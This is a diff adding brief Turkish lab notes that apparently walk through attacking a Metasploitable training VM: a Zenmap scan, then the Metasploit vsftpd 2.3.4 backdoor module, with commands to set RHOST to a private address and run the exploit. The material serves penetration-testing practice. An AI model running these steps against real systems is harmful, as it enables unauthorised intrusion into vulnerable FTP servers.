@@ -1,0 +1,17 @@
+1. oncelikle zenmapten metasploitablein ipsini aratip intense scan ile bilgisayarin acik portlarini goruyoruz.
+
+
+2. saldirmak istedigimiz acik portun versiyon ismini kopyalayip googleda exploit vsftpd 2.3.4 diye aratiyoruz. Rapid7 sitesinde bize bu porta metasploitable framework ile saldirabilmemiz icin bir modul ismi veriyor(use exploit/unix/ftp/vsftpd_234_backdoor).bunu msfte calstr
+
+
+3. msfconsole yazarak metasploitableframeworku calsitryoruz.Framework acildiktan sonra rapid7 sitesinden aldigimiz exploiti calistiriyoruz
+
+
+4. show options diyerek ilgili exploitin ayarlarini gosterir.
+	baktik rport 21 dogru mu dogru(zenmapten karsilastir)
+	rhost(saldirilacak hostumuzun ip adresi) bos yani doldurmaliyiz
+
+NOT: Bir deger msfconsoleda nasil degistirilir: set komutu ile ; set RHOST 10.0.2.5
+
+
+5.simdi ayarlar tamam sadece exploit yazip baglantiyi test ediyoruz.
